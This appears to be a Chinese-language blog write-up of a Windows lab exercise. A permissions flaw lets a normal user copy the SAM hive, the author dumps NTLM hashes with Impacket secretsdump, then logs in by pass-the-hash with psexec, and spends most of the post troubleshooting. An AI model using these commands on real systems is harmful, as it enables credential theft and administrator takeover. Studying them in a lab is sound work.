# CVE-2021-33757
## 简单说  
简而言之，属于windows的一个配置权限出错造成。  

## 实践  
我们都知道如果要获取本地的sam文件的话需要administrator的权限账户，但是微软在最近的一次更新上可以使用一般的用户权限获取dump文件 。   

这意味着，如果我们  获取到了一个普通用户权限的shell ，在可以使用PTH的情况下 ，我们就可以通过获取sam文件当中的administrator用户的hash 最后进行 pth登录 


1. 如图所示，作为一个普通的User组也能进行dump  sam文件  

![20211101002744](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002744.png)





2. 使用secretdump还原其中的ntlmhash  

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM-2021-10-14 -security SECURITY-2021-10-14 -sam SAM-2021-10-14 local
```

![20211101002757](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002757.png)



psexec 进行远程连接   

```
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.233.136 cmd
```

## 使用psexec 连接出现了一些错误  



### 1、 not writeable 这个问题并没有得到结局 

![20211101002814](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002814.png)

![20211101002838](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002838.png)

明明权限已经更改但是还是不能  

![20211101002851](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002851.png)

后面想想应该是500的原因  



### 2、 账户 disabled  

![20211101002903](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002903.png)

基于这个问题原因是administrator账户已经被禁用了  

这在win10上是默认的， 

解决的方法  

https://zhuanlan.zhihu.com/p/362058979



当运行命令之后出现的结果是   

![20211101002916](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002916.png)  



在kali当中进行连接 

![20211101002929](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002929.png)



看看靶机猜测是 需要创建密码

![20211101002940](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002940.png)





在使用镜像之前需要创建一个还原点，还原点当中会包括其中的SAM文件
![20211101002957](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101002957.png)
![20211101003007](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101003007.png)
远程连接的时候windows日常报毒  
![20211101003019](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101003019.png)

关闭之后进行   

![20211101003033](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101003033.png)







这里留下一个问题 

我明明是使用administrator创建的用户为什么在这里返回的是 system权限 ？   

```
psexec -s 的原因 
```

![20211101003047](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211101003047.png)




## refer  
system权限和administrator的权限之间的关系？ 

如何使用system权限？  



admin$ c$ ipc $ 的一些东西

https://blog.51cto.com/u_13710682/2117614



